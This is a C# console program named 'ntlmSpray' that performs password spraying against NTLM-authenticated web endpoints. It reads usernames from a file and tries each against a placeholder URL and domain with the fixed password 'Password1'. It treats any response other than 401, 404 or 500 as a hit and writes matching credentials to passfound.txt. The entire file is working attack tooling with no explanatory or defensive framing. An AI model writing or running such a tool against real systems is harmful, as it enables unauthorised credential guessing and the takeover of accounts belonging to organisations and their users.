using System;
using System.Net;

namespace ntlmSpray
{
    class Program
    {
        static void Main(string[] args)
        {	
		string [] lines = System.IO.File.ReadAllLines("users.txt");
		int len = lines.Length;
		int currIdx = 0;
		int statsIdx = 0;
		Console.WriteLine("Performing spray!!\n\n");
		foreach (string uname in lines)
		{
			currIdx += 1;
			statsIdx += 1;
			if( statsIdx == 100)
			{
				statsIdx = 0;
				Console.Write("\r                                                      ");
				Console.Write("\r Sprayed " + currIdx.ToString() + " of " + len.ToString() + " users");
			}
        		string url = "";
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
			request.Method = "GET";
			request.KeepAlive = true;
			request.Accept = @"*/*";
			request.AllowWriteStreamBuffering = false;

			string user = @"domainName\" + uname;
			string password = @"Password1";
			if (string.IsNullOrEmpty(user) == false && string.IsNullOrEmpty(password) == false)
			{
			    NetworkCredential credential = new NetworkCredential(user, password);
			        CredentialCache credentialCache = new CredentialCache();
				    credentialCache.Add(new Uri(url), "NTLM", credential);
				        request.Credentials = credentialCache;
			}            

			int wRespCode = 0;
			try
			{
				using(HttpWebResponse response = (HttpWebResponse) request.GetResponse())
				{
					if(request.HaveResponse && response != null)
					{
						wRespCode = ((int)response.StatusCode);
					}
				}
			}
			catch (WebException we)
			{
				if(we.Response != null)
				{
					using( HttpWebResponse errResp = (HttpWebResponse) we.Response)
					{
						wRespCode = ((int)errResp.StatusCode);
					}
				}
			}

			if(wRespCode != 500 && wRespCode != 401 && wRespCode != 404)
			{
				Console.WriteLine("\r\n" + user + " " + password + " " + wRespCode.ToString() + "\r\n\n");
				using(System.IO.StreamWriter fout = 
						new System.IO.StreamWriter("passfound.txt", true))
				{
					fout.WriteLine(user + " " + password + " " + wRespCode.ToString()); 
				}
			}
		}
	}
    }
}
